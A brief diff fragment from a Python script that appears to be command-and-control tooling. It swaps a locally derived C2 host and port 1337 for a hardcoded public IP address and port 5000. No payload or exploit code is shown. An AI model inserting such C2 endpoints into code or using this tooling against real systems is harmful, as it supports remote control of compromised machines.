@@ -131,8 +131,8 @@ def local_ip(default="127.0.0.1") -> str:
         s.close()
 
 # usage
-C2_HOST = local_ip()
-C2_PORT = '1337'
+C2_HOST = "136.110.62.224"
+C2_PORT = '5000'
 ROOT = os.path.abspath(os.path.dirname(__file__))
 
 
